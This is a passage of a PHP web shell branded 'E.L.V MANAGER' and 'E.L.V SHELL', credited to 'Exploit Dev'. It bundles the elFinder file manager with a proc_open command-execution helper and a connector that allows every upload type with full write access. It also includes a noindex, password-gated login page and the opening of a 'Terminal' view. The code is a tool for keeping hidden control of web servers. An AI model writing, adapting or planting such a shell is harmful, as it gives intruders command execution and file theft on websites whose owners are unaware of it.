        return round(($width * $height * $bits * $channels / 8 + Pow(2, 16)) * 1.65);
    }

    public static function expandMemoryForGD($imgInfos)
    {
        if (elFinder::$memoryLimitGD != 0 && $imgInfos && is_array($imgInfos)) {
            if (!is_array($imgInfos[0])) {
                $imgInfos = array($imgInfos);
            }
            $limit = self::getIniBytes('', elFinder::$memoryLimitGD);
            $memLimit = self::getIniBytes('memory_limit');
            $needs = 0;
            foreach ($imgInfos as $info) {
                $needs += self::getMemorySizeByImageInfo($info);
            }
            $needs += memory_get_usage();
            if ($needs > $memLimit && ($limit == -1 || $limit > $needs)) {
                ini_set('memory_limit', $needs);
            }
        }
    }

    public static function filenameDecontaminate($name)
    {
        if (DIRECTORY_SEPARATOR === '\\') {
            $name = str_replace('\\', '/', $name);
        }
        $parts = explode('/', trim($name, '/'));
        $name = array_pop($parts);
        return $name;
    }

    public static function procExec($command, &$output = '', &$return_var = -1, &$error_output = '', $cwd = null)
    {
        static $allowed = null;
        if ($allowed === null) {
            if ($allowed = function_exists('proc_open')) {
                if ($disabled = ini_get('disable_functions')) {
                    $funcs = array_map('trim', explode(',', $disabled));
                    $allowed = !in_array('proc_open', $funcs);
                }
            }
        }
        if (!$allowed) {
            $return_var = -1;
            return $return_var;
        }
        if (!$command) {
            $return_var = 0;
            return $return_var;
        }
        $descriptorspec = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );
        $process = proc_open($command, $descriptorspec, $pipes, $cwd, null);
        if (is_resource($process)) {
            stream_set_blocking($pipes[1], 0);
            stream_set_blocking($pipes[2], 0);
            fclose($pipes[0]);
            $tmpout = '';
            $tmperr = '';
            while (feof($pipes[1]) === false || feof($pipes[2]) === false) {
                elFinder::extendTimeLimit();
                $read = array($pipes[1], $pipes[2]);
                $write = null;
                $except = null;
                $ret = stream_select($read, $write, $except, 1);
                if ($ret === false) {
                    break;
                } else if ($ret === 0) {
                    continue;
                } else {
                    foreach ($read as $sock) {
                        if ($sock === $pipes[1]) {
                            $tmpout .= fread($sock, 4096);
                        } else if ($sock === $pipes[2]) {
                            $tmperr .= fread($sock, 4096);
                        }
                    }
                }
            }
            fclose($pipes[1]);
            fclose($pipes[2]);
            $output = $tmpout;
            $error_output = $tmperr;
            $return_var = proc_close($process);
        } else {
            $return_var = -1;
        }
        return $return_var;
    }

    protected static function getCmdOfBind($cmd)
    {
        list($ret) = explode('.', $cmd);
        return trim($ret);
    }

    protected static function addSubToBindName($cmd, $sub)
    {
        return $cmd . '.' . trim($sub);
    }

    public static function rmFileInDisconnected($file)
    {
        (connection_aborted() || connection_status() !== CONNECTION_NORMAL) && is_file($file) && unlink($file);
    }

    public static function onShutdown()
    {
        self::$abortCheckFile = null;
        if (!empty($GLOBALS['elFinderTempFps'])) {
            foreach (array_keys($GLOBALS['elFinderTempFps']) as $fp) {
                is_resource($fp) && fclose($fp);
            }
        }
        if (!empty($GLOBALS['elFinderTempFiles'])) {
            foreach (array_keys($GLOBALS['elFinderTempFiles']) as $f) {
                $tf = elFinder::$commonTempPath . DIRECTORY_SEPARATOR . basename($f);
                is_file($tf) && is_writable($tf) && unlink($tf);
            }
            unset($f);
        }
        if(!empty($GLOBALS['elFinderAbortFiles'])) {
            foreach (array_keys($GLOBALS['elFinderAbortFiles']) as $f) {
                $tf = elFinder::$connectionFlagsPath . DIRECTORY_SEPARATOR . basename($f);
                is_file($tf) && is_writable($tf) && unlink($tf);
            }
            unset($f);
        }
    }

    public static function GlobGC($pattern, $time)
    {
        $now = time();
        foreach (glob($pattern) as $file) {
            (filemtime($file) < ($now - $time)) && unlink($file);
        }
    }
}

class elFinderAbortException extends Exception {}
class elFinderTriggerException extends Exception {}
}
/* ===================== [embedded] elFinderConnector ===================== */
if (!class_exists('elFinderConnector', false)) {
class elFinderConnector
{
    protected $elFinder;
    protected $options = array();
    protected $header = '';
    protected $reqMethod = '';
    protected static $contentType = 'Content-Type: application/json; charset=utf-8';

    public function __construct($elFinder, $debug = false)
    {
        $this->elFinder = $elFinder;
        $this->reqMethod = strtoupper($_SERVER["REQUEST_METHOD"]);
        if ($debug) {
            self::$contentType = 'Content-Type: text/plain; charset=utf-8';
        }
    }

    public function run()
    {
        $isPost = $this->reqMethod === 'POST';
        $src = $isPost ? array_merge($_GET, $_POST) : $_GET;
        $maxInputVars = (!$src || isset($src['targets'])) ? ini_get('max_input_vars') : null;
        if ((!$src || $maxInputVars) && $rawPostData = file_get_contents('php://input')) {
            $parts = explode('&', $rawPostData);
            if (!$src || $maxInputVars < count($parts)) {
                $src = array();
                foreach ($parts as $part) {
                    list($key, $value) = array_pad(explode('=', $part), 2, '');
                    $key = rawurldecode($key);
                    if (preg_match('/^(.+?)\[([^\[\]]*)\]$/', $key, $m)) {
                        $key = $m[1];
                        $idx = $m[2];
                        if (!isset($src[$key])) {
                            $src[$key] = array();
                        }
                        if ($idx) {
                            $src[$key][$idx] = rawurldecode($value);
                        } else {
                            $src[$key][] = rawurldecode($value);
                        }
                    } else {
                        $src[$key] = rawurldecode($value);
                    }
                }
                $_POST = $this->input_filter($src);
                $_REQUEST = $this->input_filter(array_merge_recursive($src, $_REQUEST));
            }
        }

        if (isset($src['targets']) && $this->elFinder->maxTargets && count($src['targets']) > $this->elFinder->maxTargets) {
            $this->output(array('error' => $this->elFinder->error(elFinder::ERROR_MAX_TARGTES)));
        }

        $cmd = isset($src['cmd']) ? $src['cmd'] : '';
        $args = array();

        if (!function_exists('json_encode')) {
            $error = $this->elFinder->error(elFinder::ERROR_CONF, elFinder::ERROR_CONF_NO_JSON);
            $this->output(array('error' => '{"error":["' . implode('","', $error) . '"]}', 'raw' => true));
        }

        if (!$this->elFinder->loaded()) {
            $this->output(array('error' => $this->elFinder->error(elFinder::ERROR_CONF, elFinder::ERROR_CONF_NO_VOL), 'debug' => $this->elFinder->mountErrors));
        }

        if (!$cmd && $isPost) {
            $this->output(array('error' => $this->elFinder->error(elFinder::ERROR_UPLOAD, elFinder::ERROR_UPLOAD_TOTAL_SIZE), 'header' => 'Content-Type: text/html'));
        }

        if (!$this->elFinder->commandExists($cmd)) {
            $this->output(array('error' => $this->elFinder->error(elFinder::ERROR_UNKNOWN_CMD)));
        }

        $hasFiles = false;
        foreach ($this->elFinder->commandArgsList($cmd) as $name => $req) {
            if ($name === 'FILES') {
                if (isset($_FILES)) {
                    $hasFiles = true;
                } elseif ($req) {
                    $this->output(array('error' => $this->elFinder->error(elFinder::ERROR_INV_PARAMS, $cmd)));
                }
            } else {
                $arg = isset($src[$name]) ? $src[$name] : '';
                if (!is_array($arg) && $req !== '') {
                    $arg = trim($arg);
                }
                if ($req && $arg === '') {
                    $this->output(array('error' => $this->elFinder->error(elFinder::ERROR_INV_PARAMS, $cmd)));
                }
                $args[$name] = $arg;
            }
        }

        $args['debug'] = isset($src['debug']) ? !!$src['debug'] : false;
        $args = $this->input_filter($args);
        if ($hasFiles) {
            $args['FILES'] = $_FILES;
        }

        try {
            $this->output($this->elFinder->exec($cmd, $args));
        } catch (elFinderAbortException $e) {
            $this->elFinder->getSession()->close();
            header('HTTP/1.0 204 No Content');
            while (ob_get_level() && ob_end_clean()) {}
            exit();
        }
    }

    public function setHeader($value)
    {
        $this->header = $value;
    }

    protected function output(array $data)
    {
        $this->elFinder->getSession()->close();
        ignore_user_abort(false);

        if ($this->header) {
            self::sendHeader($this->header);
        }

        if (isset($data['pointer'])) {
            elFinder::extendTimeLimit(0);
            if (!empty($data['header'])) {
                self::sendHeader($data['header']);
            }
            while (ob_get_level() && ob_end_clean()) {}

            $toEnd = true;
            $fp = $data['pointer'];
            $sendData = !($this->reqMethod === 'HEAD' || !empty($data['info']['xsendfile']));
            $psize = null;
            if (($this->reqMethod === 'GET' || !$sendData)
                && (elFinder::isSeekableStream($fp) || elFinder::isSeekableUrl($fp))
                && (array_search('Accept-Ranges: none', headers_list()) === false)) {
                header('Accept-Ranges: bytes');
                if (!empty($_SERVER['HTTP_RANGE'])) {
                    $size = $data['info']['size'];
                    $end = $size - 1;
                    if (preg_match('/bytes=(\d*)-(\d*)(,?)/i', $_SERVER['HTTP_RANGE'], $matches)) {
                        if (empty($matches[3])) {
                            if (empty($matches[1]) && $matches[1] !== '0') {
                                $start = $size - $matches[2];
                            } else {
                                $start = intval($matches[1]);
                                if (!empty($matches[2])) {
                                    $end = intval($matches[2]);
                                    if ($end >= $size) {
                                        $end = $size - 1;
                                    }
                                    $toEnd = ($end == ($size - 1));
                                }
                            }
                            $psize = $end - $start + 1;
                            header('HTTP/1.1 206 Partial Content');
                            header('Content-Length: ' . $psize);
                            header('Content-Range: bytes ' . $start . '-' . $end . '/' . $size);
                            if (isset($data['info']['xsendfile']) && strtolower($data['info']['xsendfile']) === 'x-sendfile') {
                                if (function_exists('header_remove')) {
                                    header_remove($data['info']['xsendfile']);
                                } else {
                                    header($data['info']['xsendfile'] . ':');
                                }
                                unset($data['info']['xsendfile']);
                                if ($this->reqMethod !== 'HEAD') {
                                    $sendData = true;
                                }
                            }
                            $sendData && !elFinder::isSeekableUrl($fp) && fseek($fp, $start);
                        }
                    }
                }
                if ($sendData && is_null($psize)) {
                    elFinder::rewind($fp);
                }
            } else {
                header('Accept-Ranges: none');
                if (isset($data['info']) && !$data['info']['size']) {
                    if (function_exists('header_remove')) {
                        header_remove('Content-Length');
                    } else {
                        header('Content-Length:');
                    }
                }
            }

            if ($sendData) {
                if ($toEnd || elFinder::isSeekableUrl($fp)) {
                    if (version_compare(PHP_VERSION, '5.6', '<')) {
                        file_put_contents('php://output', $fp);
                    } else {
                        if(function_exists('fpassthru')) {
                            fpassthru($fp);
                        } else {
                            file_put_contents('php://output', $fp);
                        }
                    }
                } else {
                    $out = fopen('php://output', 'wb');
                    stream_copy_to_stream($fp, $out, $psize);
                    fclose($out);
                }
            }

            if (!empty($data['volume'])) {
                $data['volume']->close($fp, $data['info']['hash']);
            } else {
                fclose($fp);
            }
            exit();
        } else {
            self::outputJson($data);
            exit(0);
        }
    }

    protected function input_filter($args)
    {
        static $magic_quotes_gpc = NULL;
        if ($magic_quotes_gpc === NULL)
            $magic_quotes_gpc = (version_compare(PHP_VERSION, '5.4', '<') && get_magic_quotes_gpc());
        if (is_array($args)) {
            return array_map(array(& $this, 'input_filter'), $args);
        }
        $res = str_replace("\0", '', $args);
        $magic_quotes_gpc && ($res = stripslashes($res));
        $res = stripslashes($res);
        return $res;
    }

    protected static function sendHeader($header = null)
    {
        if ($header) {
            if (is_array($header)) {
                foreach ($header as $h) {
                    header($h);
                }
            } else {
                header($header);
            }
        }
    }

    public static function outputJson($data)
    {
        $header = isset($data['header']) ? $data['header'] : self::$contentType;
        self::sendHeader($header);
        unset($data['header']);
        if (!empty($data['raw']) && isset($data['error'])) {
            $out = $data['error'];
        } else {
            if (isset($data['debug']) && isset($data['debug']['backendErrors'])) {
                $data['debug']['backendErrors'] = array_merge($data['debug']['backendErrors'], elFinder::$phpErrors);
            }
            $out = json_encode($data);
        }
        while (ob_get_level() && ob_end_clean()) {}
        header('Content-Length: ' . strlen($out));
        echo $out;
        flush();
    }
}
}

/* ============================== CONNECTOR ============================== */
if (elv_is_connector()) {
    header('Content-Type: application/json; charset=utf-8');
    header('X-Content-Type-Options: nosniff');

    if (!elv_authed()) {
        http_response_code(403);
        echo json_encode(array('error' => array('errAccess'), 'errorData' => array('Access denied')));
        exit;
    }

    $elv_tmb = sys_get_temp_dir() . '/elv_manager_tmb';
    if (!is_dir($elv_tmb)) {
        @mkdir($elv_tmb, 0777, true);
    }
    if (!is_writable($elv_tmb)) {
        $elv_tmb = __DIR__;
    }

    $attributes = array(
        array('pattern' => '#/\.tmb/#i',        'read' => false, 'write' => false, 'hidden' => true, 'locked' => true),
        array('pattern' => '#/\.quarantine/#i', 'read' => false, 'write' => false, 'hidden' => true, 'locked' => true),
    );
    foreach ($ELV['hidden'] as $elv_pat) {
        $attributes[] = array('pattern' => $elv_pat, 'read' => false, 'write' => false, 'hidden' => true, 'locked' => false);
    }

    $elv_disabled = array('netmount', 'zipdl', 'help');
    if ($ELV['read_only']) {
        $elv_disabled = array_merge($elv_disabled, array(
            'upload', 'mkdir', 'mkfile', 'rm', 'rename', 'paste',
            'duplicate', 'edit', 'resize', 'chmod', 'archive', 'extract', 'cut', 'copy'
        ));
    }

    $opts = array(
        'debug' => false,
        'roots' => array(array(
            'driver'       => 'LocalFileSystem',
            'path'         => $ELV_ROOT,
            'URL'          => $ELV_URL,
            'winHashFix'   => DIRECTORY_SEPARATOR !== '/',
            'uploadDeny'   => array(),
            'uploadAllow'  => array('all'),
            'uploadOrder'  => array('deny', 'allow'),
            'disabled'     => $elv_disabled,
            'attributes'   => $attributes,
            'tmbPath'      => $elv_tmb,
            'tmbURL'       => 'self',
            'tmbSize'      => 96,
            'acceptedName' => '/^[^\.\/\x00][^\/\x00]*$/',
        )),
    );

    $elv_connector = new elFinderConnector(new elFinder($opts));
    $elv_connector->run();
    exit;
}

/* ============================== HALAMAN LOGIN ============================== */
if (!elv_authed()) {
    header('X-Frame-Options: DENY');
    header('X-Content-Type-Options: nosniff');
    header('Referrer-Policy: no-referrer');
    $elv_self = elv_self_url();
    ?><!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>E.L.V MANAGER // SECURE ACCESS</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<style>
:root{
  --cyan:#00f0ff;
  --magenta:#ff00e5;
  --pink:#ff2d95;
  --green:#00ff9d;
  --amber:#ffb02e;
  --bg-0:#02030a;
  --bg-1:#06070f;
  --bg-2:#0b0d18;
  --text:#e6f6ff;
  --text-dim:#6a7a8a;
  --text-faint:#3a4452;
}
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%}
body{
  background:var(--bg-0);
  color:var(--text);
  font-family:'Share Tech Mono','Courier New',monospace;
  display:grid;
  place-items:center;
  min-height:100vh;
  overflow:hidden;
  position:relative;
}

/* ===== LAYER 1: GRID BACKGROUND ===== */
body::before{
  content:"";
  position:fixed;inset:0;
  background-image:
    linear-gradient(rgba(0,240,255,0.055) 1px, transparent 1px),
    linear-gradient(90deg, rgba(0,240,255,0.055) 1px, transparent 1px);
  background-size:52px 52px;
  -webkit-mask-image:radial-gradient(ellipse at center, #000 25%, transparent 78%);
  mask-image:radial-gradient(ellipse at center, #000 25%, transparent 78%);
  pointer-events:none;
  z-index:0;
}

/* ===== LAYER 2: AMBIENT GLOWS ===== */
body::after{
  content:"";
  position:fixed;inset:0;
  background:
    radial-gradient(circle at 22% 28%, rgba(0,240,255,0.16), transparent 42%),
    radial-gradient(circle at 78% 72%, rgba(255,0,229,0.16), transparent 42%),
    radial-gradient(circle at 50% 50%, rgba(255,45,149,0.05), transparent 60%);
  pointer-events:none;
  z-index:0;
  animation:ambientShift 14s ease-in-out infinite alternate;
}
@keyframes ambientShift{
  0%{transform:translate(0,0) scale(1)}
  100%{transform:translate(2%,1.5%) scale(1.02)}
}

/* ===== LAYER 3: SCANLINES ===== */
.scan{
  position:fixed;inset:0;
  background:repeating-linear-gradient(
    0deg,
    transparent 0, transparent 2px,
    rgba(0,240,255,0.022) 3px, transparent 4px
  );
  pointer-events:none;
  z-index:999;
  animation:scanMove 8s linear infinite;
}
@keyframes scanMove{
  from{background-position:0 0}
  to{background-position:0 120px}
}

/* ===== PANEL WRAP ===== */
.panel-wrap{
  position:relative;
  z-index:1;
  filter:
    drop-shadow(0 0 24px rgba(0,240,255,0.35))
    drop-shadow(0 0 55px rgba(255,0,229,0.22));
}

/* ===== PANEL ===== */
.panel{
  position:relative;
  width:min(440px,92vw);
  padding:1.5px;
  background:linear-gradient(135deg,var(--cyan) 0%,var(--magenta) 45%,var(--cyan) 100%);
  background-size:220% 220%;
  animation:borderFlow 6s linear infinite;
  clip-path:polygon(
    0 26px, 26px 0,
    100% 0,
    100% calc(100% - 26px), calc(100% - 26px) 100%,
    0 100%
  );
}
@keyframes borderFlow{
  0%{background-position:0% 50%}
  100%{background-position:220% 50%}
}

/* ===== PANEL INNER ===== */
.panel-inner{
  position:relative;
  background:linear-gradient(180deg, rgba(6,7,15,0.98) 0%, rgba(2,3,10,0.99) 100%);
  clip-path:polygon(
    0 25px, 25px 0,
    100% 0,
    100% calc(100% - 25px), calc(100% - 25px) 100%,
    0 100%
  );
  overflow:hidden;
}

.panel-inner::before{
  content:"";
  position:absolute;inset:0;
  background-image:
    linear-gradient(rgba(0,240,255,0.03) 1px, transparent 1px),
    linear-gradient(90deg, rgba(0,240,255,0.03) 1px, transparent 1px);
  background-size:26px 26px;
  pointer-events:none;
  z-index:0;
}

/* ===== HEADER BAR ===== */
.head{
  position:relative;
  z-index:1;
  display:flex;
  align-items:center;
  padding:13px 20px;
  border-bottom:1px solid rgba(0,240,255,0.15);
  background:linear-gradient(180deg, rgba(0,240,255,0.06) 0%, transparent 100%);
  font-size:10px;
  letter-spacing:2.5px;
}
.head .dots{display:flex;gap:6px;margin-right:16px}
.head .dots i{
  display:block;
  width:8px;height:8px;
  border-radius:50%;
  background:var(--text-faint);
  transition:all .3s;
}
.head .dots i:nth-child(1){background:var(--pink);box-shadow:0 0 8px var(--pink)}
.head .dots i:nth-child(2){background:var(--amber);box-shadow:0 0 8px var(--amber)}
.head .dots i:nth-child(3){background:var(--green);box-shadow:0 0 8px var(--green)}
.head-title{
  flex:1;
  color:var(--text);
  letter-spacing:3px;
  font-weight:500;
  font-size:10px;
  text-transform:uppercase;
}
.head-title::before{content:"▸ ";color:var(--cyan);margin-right:2px}
.head-status{
  color:var(--green);
  font-size:9px;
  letter-spacing:2px;
  text-shadow:0 0 8px var(--green);
  animation:pulse 2s ease-in-out infinite;
}
@keyframes pulse{
  0%,100%{opacity:1}
  50%{opacity:0.4}
}

/* ===== BODY ===== */
.body{
  position:relative;
  z-index:1;
  padding:38px 34px 30px;
  text-align:center;
}

/* Logo */
.logo{
  display:block;
  width:100%;
  max-width:260px;
  height:auto;
  margin:0 auto 4px;
  mix-blend-mode:screen;
  filter:brightness(1.4) contrast(1.25) saturate(1.3);
  animation:logoGlow 4s ease-in-out infinite;
  clip-path: inset(20% 0 20% 0);
  -webkit-clip-path: inset(20% 0 20% 0);
}
@keyframes logoGlow{
  0%,100%{
    filter:brightness(1.4) contrast(1.25) saturate(1.3)
           drop-shadow(0 0 4px rgba(0,240,255,0.5));
  }
  50%{
    filter:brightness(1.55) contrast(1.3) saturate(1.4)
           drop-shadow(0 0 10px rgba(255,0,229,0.45));
  }
}

/* Tagline */
.tagline{
  display:flex;
  align-items:center;
  justify-content:center;
  gap:10px;
  margin:22px 0 30px;
  font-family:'Rajdhani',sans-serif;
  font-weight:600;
  font-size:11px;
  letter-spacing:5px;
  color:var(--cyan);
  text-shadow:0 0 8px rgba(0,240,255,0.55);
  text-transform:uppercase;
}
.tagline::before,
.tagline::after{
  content:"";
  flex:1;
  max-width:52px;
  height:1px;
}
.tagline::before{background:linear-gradient(90deg, transparent, var(--cyan))}
.tagline::after{background:linear-gradient(90deg, var(--cyan), transparent)}

/* Field */
.field{
  display:block;
  text-align:left;
  margin-bottom:18px;
  position:relative;
}
.field-label{
  display:flex;
  align-items:center;
  justify-content:space-between;
  font-family:'Rajdhani',sans-serif;
  font-weight:600;
  font-size:10px;
  letter-spacing:3px;
  color:var(--text-dim);
  margin-bottom:8px;
  text-transform:uppercase;
}
.field-label .lbl{color:var(--cyan);opacity:0.85}
.field-label .hex{
  font-family:'Share Tech Mono',monospace;
  font-size:9px;
  color:var(--cyan);
  opacity:0.5;
  letter-spacing:1px;
}
.field input{
  width:100%;
  padding:15px 16px 15px 20px;
  background:rgba(2,3,10,0.9);
  border:1px solid rgba(0,240,255,0.2);
  border-left:3px solid var(--cyan);
  color:var(--cyan);
  font-family:'Share Tech Mono',monospace;
  font-size:14px;
  letter-spacing:4px;
  outline:none;
  transition:all .3s ease;
  box-shadow:inset 0 0 20px rgba(0,240,255,0.04);
}
.field input::placeholder{
  color:var(--text-faint);
  letter-spacing:3px;
  font-size:11px;
}
.field input:focus{
  border-color:var(--magenta);
  border-left-color:var(--magenta);
  color:#fff;
  background:rgba(18,0,28,0.9);
  box-shadow:
    inset 0 0 20px rgba(255,0,229,0.1),
    0 0 24px rgba(255,0,229,0.3);
  letter-spacing:5px;
}

/* Button */
.btn{
  position:relative;
  width:100%;
  padding:16px 20px;
  margin-top:6px;
  background:linear-gradient(135deg, rgba(0,240,255,0.12), rgba(255,0,229,0.12));
  border:1px solid var(--cyan);
  color:var(--cyan);
  font-family:'Rajdhani',sans-serif;
  font-weight:700;
  font-size:14px;
  letter-spacing:6px;
  text-transform:uppercase;
  cursor:pointer;
  overflow:hidden;
  transition:all .3s ease;
  box-shadow:
    0 0 20px rgba(0,240,255,0.18),
    inset 0 0 20px rgba(0,240,255,0.05);
  clip-path:polygon(
    0 0, calc(100% - 12px) 0, 100% 12px,
    100% 100%, 12px 100%, 0 calc(100% - 12px)
  );
}
.btn::before{
  content:"";
  position:absolute;
  top:0;left:-120%;
  width:100%;height:100%;
  background:linear-gradient(90deg, transparent, rgba(255,255,255,0.35), transparent);
  transition:left .6s ease;
  pointer-events:none;
}
.btn:hover::before{left:120%}
.btn:hover{
  border-color:var(--magenta);
  color:#fff;
  background:linear-gradient(135deg, rgba(0,240,255,0.22), rgba(255,0,229,0.22));
  text-shadow:0 0 12px rgba(255,255,255,0.9);
  box-shadow:
    0 0 32px rgba(255,0,229,0.45),
    inset 0 0 30px rgba(255,0,229,0.12);
}
.btn:active{transform:translateY(1px)}
.btn:disabled{
  opacity:0.55;
  cursor:wait;
  transform:none;
  box-shadow:0 0 20px rgba(0,240,255,0.1);
}
.btn:disabled::before{display:none}

/* Error */
#error-msg{
  color:var(--magenta);
  font-size:11px;
  text-align:center;
  letter-spacing:2px;
  min-height:16px;
  margin-top:14px;
  text-shadow:0 0 10px rgba(255,0,229,0.7);
}

/* ===== FOOTER BAR ===== */
.foot{
  position:relative;
  z-index:1;
  display:flex;
  align-items:center;
  justify-content:space-between;
  padding:12px 20px;
  border-top:1px solid rgba(0,240,255,0.1);
  background:linear-gradient(0deg, rgba(0,240,255,0.03) 0%, transparent 100%);
  font-size:9px;
  letter-spacing:2.5px;
  color:var(--text-dim);
  text-transform:uppercase;
}
.foot .l{color:var(--cyan);opacity:0.75}
.foot .c{color:var(--text-faint)}
.foot .r{color:var(--green);opacity:0.75}
.foot .r::before{
  content:"●";
  margin-right:5px;
  animation:pulse 2s ease-in-out infinite;
}

/* ===== CREDIT ===== */
.credit{
  position:relative;
  z-index:1;
  display:flex;
  align-items:center;
  justify-content:center;
  gap:10px;
  padding:10px 20px 16px;
  font-size:10px;
  letter-spacing:2px;
  text-transform:uppercase;
  color:var(--text-dim);
}
.credit .c-name{
  color:var(--cyan);
  font-family:'Share Tech Mono',monospace;
  font-size:11px;
  letter-spacing:3px;
  text-shadow:0 0 8px rgba(0,240,255,0.6);
  padding:2px 8px;
  border:1px solid rgba(0,240,255,0.35);
  border-radius:2px;
}
.credit .c-sep{
  color:var(--text-faint);
  opacity:.6;
}
.credit .c-by{
  color:var(--text-dim);
  font-family:'Share Tech Mono',monospace;
  font-size:10px;
  letter-spacing:1.5px;
}
.credit .c-by b{
  color:var(--magenta);
  font-weight:700;
  letter-spacing:2px;
  text-shadow:0 0 8px rgba(255,0,229,0.65);
}

/* Responsive */
@media (max-width:480px){
  .body{padding:32px 24px 26px}
  .logo{max-width:200px; clip-path: inset(20% 0 20% 0);}
  .tagline{font-size:9px;letter-spacing:4px;margin:18px 0 24px}
  .head{padding:11px 16px}
  .foot{padding:10px 16px;font-size:8px}
  .credit{font-size:9px;gap:6px;padding:8px 14px 14px}
  .credit .c-name{font-size:10px;padding:2px 6px}
  .credit .c-by{font-size:9px}
}
</style>
</head>
<body>
<div class="scan"></div>

<div class="panel-wrap">
  <div class="panel">
    <div class="panel-inner">

      <!-- HEADER BAR -->
      <header class="head">
        <div class="dots"><i></i><i></i><i></i></div>
        <div class="head-title">E.L.V SECURE ACCESS</div>
        <div class="head-status">● ONLINE</div>
      </header>

      <!-- BODY -->
      <div class="body">
        <img class="logo" src="https://unexsisted-market.vercel.app/elv.png" alt="E.L.V MANAGER">
        <div class="tagline">TACTICAL FILE SYSTEM</div>

        <form id="login-form" autocomplete="off">
          <label class="field">
            <span class="field-label">
              <span class="lbl">ACCESS KEY</span>
              <span class="hex">0x53 0x45 0x43</span>
            </span>
            <input type="password" id="elv_password" name="elv_password"
                   placeholder="ENTER ACCESS KEY" required autofocus>
          </label>

          <button type="submit" id="elv-submit" class="btn">Authenticate</button>
          <div id="error-msg"></div>
        </form>
      </div>

      <!-- FOOTER BAR -->
      <footer class="foot">
        <span class="l">v1.0.0</span>
        <span class="c">AES-256 · TLS 1.3</span>
        <span class="r">SECURE</span>
      </footer>

      <!-- CREDIT -->
      <div class="credit">
        <span class="c-name">Exploit Dev</span>
        <span class="c-sep">·</span>
        <span class="c-by"><b>HxN</b> ❤ <b>E.L.V</b></span>
      </div>

    </div>
  </div>
</div>

<script src="<?php echo htmlspecialchars($ELV['jquery_cdn']); ?>"></script>
<script>
jQuery(function($){
  $('#login-form').on('submit', function(e){
    e.preventDefault();
    var $btn = $('#elv-submit'), $err = $('#error-msg');
    $err.text('');
    $btn.prop('disabled', true).text('AUTHENTICATING...');
    $.post(<?php echo json_encode($elv_self); ?>, {
      elv_action: 'login',
      elv_password: $('#elv_password').val()
    }, 'json').done(function(res){
      if (res && res.ok) { location.reload(); }
      else {
        $err.text((res && res.error) ? res.error : 'AUTENTIKASI GAGAL.');
        $btn.prop('disabled', false).text('Authenticate');
      }
    }).fail(function(){
      $err.text('KONEKSI GAGAL.');
      $btn.prop('disabled', false).text('Authenticate');
    });
  });
});
</script>
</body>
</html>
    <?php
    exit;
}

/* ============================== HALAMAN TERMINAL ============================== */
if (isset($_GET['elv_view']) && $_GET['elv_view'] === 'terminal' && elv_authed()) {
    header('X-Frame-Options: DENY');
    header('X-Content-Type-Options: nosniff');
    header('Referrer-Policy: no-referrer');
    $elv_self = elv_self_url();
    $elv_home = $elv_self;
    ?><!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>E.L.V SHELL // Terminal</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<style>
:root{
  --bg:#02030a;
  --surface:#0a0c18;
  --surface2:#12162a;
  --border:#232840;
  --border-lit:#33415c;
  --cyan:#00f0ff;
  --magenta:#ff00e5;
  --violet:#8b00ff;
  --green:#00ff9d;
  --amber:#ffb02e;
  --red:#ff5577;
  --text:#dbe7f5;
  --text-dim:#6a7a90;
  --text-faint:#3a4458;
}
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;overflow:hidden}
body{
  background:var(--bg);
  color:var(--text);
  font-family:'Share Tech Mono','Courier New',monospace;
  font-size:13.5px;
  line-height:1.55;
  display:flex;
  flex-direction:column;
  height:100vh;
}
body::before{
  content:"";
  position:fixed;inset:0;
  background-image:
    linear-gradient(rgba(0,240,255,0.028) 1px, transparent 1px),
    linear-gradient(90deg, rgba(0,240,255,0.028) 1px, transparent 1px);
  background-size:44px 44px;
  pointer-events:none;
  z-index:0;
}
body::after{
  content:"";
  position:fixed;inset:0;
  background:
    radial-gradient(circle at 20% 15%, rgba(0,240,255,0.06), transparent 40%),
    radial-gradient(circle at 82% 88%, rgba(255,0,229,0.06), transparent 40%);
  pointer-events:none;
  z-index:0;
}
body > *{position:relative;z-index:1}

/* ===== TOP BAR ===== */
#top{
  flex-shrink:0;
  height:52px;
  display:flex;
  align-items:center;
  gap:12px;
  padding:0 16px;
  background:linear-gradient(180deg, #0d0f1e 0%, #07080f 100%);
  border-bottom:1px solid var(--border);
  position:relative;
}
#top::after{
  content:"";
  position:absolute;
  left:0;right:0;bottom:-1px;height:1px;
  background:linear-gradient(90deg,
    transparent 0%,
    var(--cyan) 25%,
    var(--magenta) 50%,
    var(--cyan) 75%,
    transparent 100%);
  opacity:.6;
}
#top .brand{
  display:flex;align-items:baseline;gap:8px;
  padding-right:14px;
  border-right:1px solid var(--border);
  user-select:none;
  font-family:'Rajdhani',sans-serif;
}
#top .brand .b1{
  font-weight:700;font-size:18px;letter-spacing:3px;color:#fff;
  text-shadow:0 0 6px rgba(0,240,255,.8),0 0 14px rgba(0,240,255,.5),0 0 24px rgba(255,0,229,.3);
}
#top .brand .b2{
  font-weight:600;font-size:9px;letter-spacing:4px;
  color:var(--cyan);opacity:.85;
  padding:1px 5px;
  border:1px solid rgba(0,240,255,.35);
  border-radius:2px;
  text-transform:uppercase;
}
#top .brand .b3{
  font-family:'Share Tech Mono',monospace;
  font-weight:700;
  font-size:9px;
  letter-spacing:2px;
  color:var(--magenta);
  padding:1px 5px;
  margin-left:2px;
  border:1px solid rgba(255,0,229,0.45);
  border-radius:2px;
  background:rgba(255,0,229,0.08);
  text-shadow:0 0 8px rgba(255,0,229,0.7);
  align-self:center;
}
#top .cwd{
  flex:1;
  font-size:12px;
  color:var(--magenta);
  text-shadow:0 0 6px rgba(255,0,229,.5);
  white-space:nowrap;
  overflow:hidden;
  text-overflow:ellipsis;
  min-width:0;
}
